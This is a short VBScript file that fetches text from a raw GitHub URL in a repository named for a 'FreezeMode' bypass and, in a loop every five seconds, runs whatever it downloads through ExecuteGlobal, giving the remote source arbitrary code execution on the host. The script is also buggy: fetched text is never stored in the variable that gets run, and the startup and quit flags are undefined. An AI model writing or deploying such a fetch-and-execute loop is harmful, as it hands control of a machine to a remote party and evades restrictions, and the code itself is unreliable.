Dim url, http, cmd, oldcmd

Set http = CreateObject("MSXML2.XMLHTTP")
url = "https://raw.githubusercontent.com/Wywren/_UNLISTED_FreezeModeBypass/refs/heads/main/prompt_v2.vbs"

Function getcmd()
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        getcmd = http.ResponseText
    Else
        MsgBox "Error Code: " & http.Status, vbCritical, "FreezeMode"
        getcmd = Nothing
    End If
End Function

getcmd()
MsgBox cmd
oldcmd = ""

If startup = 1 Then
    Do  
        getcmd()
        If Not cmd = oldcmd Then
            ExecuteGlobal cmd
            oldcmd = cmd
        End If
        WScript.Sleep 5000
    Loop While quit = 0
End If

' this is maybe redundant
Set http = Nothing
